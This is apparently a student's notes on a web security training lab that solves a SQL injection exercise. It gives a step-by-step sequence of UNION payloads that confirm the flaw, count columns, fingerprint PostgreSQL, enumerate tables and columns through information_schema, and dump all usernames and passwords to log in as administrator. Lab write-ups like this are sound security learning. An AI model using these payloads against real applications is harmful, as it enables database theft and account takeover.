## Lab 10 - SQL injection attack, listing the database contents on non-Oracle databases

**SQL injection at** - Product category in URL  

**End Goals :-**  
- Find the tables in the data base  
- Find the columns in that table  
- Find the username and password columns  
- Find admin's username and password

---
### Analysis:
- `'--` works means vulnerable to sqli.

- `' UNION SELECT * FROM information_schema.tables--` gives *500 internal server error*  
-> but `' UNION SELECT NULL,NULL--` this works means UNION attack is possible.

- We know we have 2 columns so, we give `' UNION SELECT 'a',NULL--` now we know 1st column returns string.

- `' UNION SELECT version(),NULL--` used this payload is for MySQL  
got -> `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`  
-> Now i know we are working with PostgreSQL.

NOTE:- MySQL supports both `version()` and `@@version`.

- `' UNION SELECT table_name, NULL From information_schema.tables--+` we already know 2 columns exist so we use 1 column for retrieving names from the schema view.  
-> Got many table names but `users_bdxshn` this looked like it had users information.

- `' UNION SELECT column_name, NULL From information_schema.columns WHERE table_name = 'users_bdxshn'--`  
-> this shows us the columns like `username_smfjip` & `password_mxfvww` inside the `users_bdxshn` table. 

- `' UNION SELECT username_smfjip, password_mxfvww FROM%20 users_bdxshn--`  
This shows all the usernames and passwords from the `username_smfjip` & `password_mxfvww` column.

- Just look for administrator username and it's password, and login using that.